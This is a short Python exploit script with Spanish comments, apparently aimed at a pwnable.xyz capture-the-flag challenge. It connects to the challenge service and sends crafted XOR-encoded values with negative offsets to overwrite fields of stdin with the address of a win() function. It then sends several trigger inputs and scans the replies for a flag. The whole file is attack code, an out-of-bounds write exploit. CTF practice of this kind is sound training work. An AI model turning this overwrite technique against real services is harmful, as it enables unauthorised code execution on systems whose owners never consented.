#!/usr/bin/env python3
import socket
import time

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(40)
s.connect((host, port))

banner = s.recv(1024)
print(banner.decode())

win_addr = 0xa21

# Intentar sobrescribir múltiples campos de stdin
# con direcciones a win() o valores que causen ejecución

print("Sobrescribiendo múltiples campos de stdin...")

# Intentar con offsets -9 a -4
for offset in range(-9, -3):
    b = abs(offset) * 0x1111
    a = win_addr ^ b
    payload = f"{a} {b} {offset}\n"
    print(f"  result[{offset}] = win_addr")
    s.sendall(payload.encode())
    time.sleep(0.2)
    try:
        resp = s.recv(1024, socket.MSG_DONTWAIT)
    except:
        pass

print("\nIntentando triggerar...")

# Intentar diferentes formas de triggerar
attempts = [
    "0 1 1\n",      # a=0 para exit
    "1 0 1\n",      # b=0 para exit  
    "1 1 10\n",     # c>9 para exit
    "\n",           # input vacío
    "AAAA\n",       # input inválido
]

for attempt in attempts:
    try:
        s.sendall(attempt.encode())
        time.sleep(1)
        data = s.recv(4096)
        if data:
            print(f"\nRespuesta a '{attempt.strip()}':")
            print(data.decode())
            if b"FLAG" in data or b"flag" in data or b"{" in data:
                break
    except:
        print(f"Crash o cierre con: {attempt.strip()}")
        break

s.close()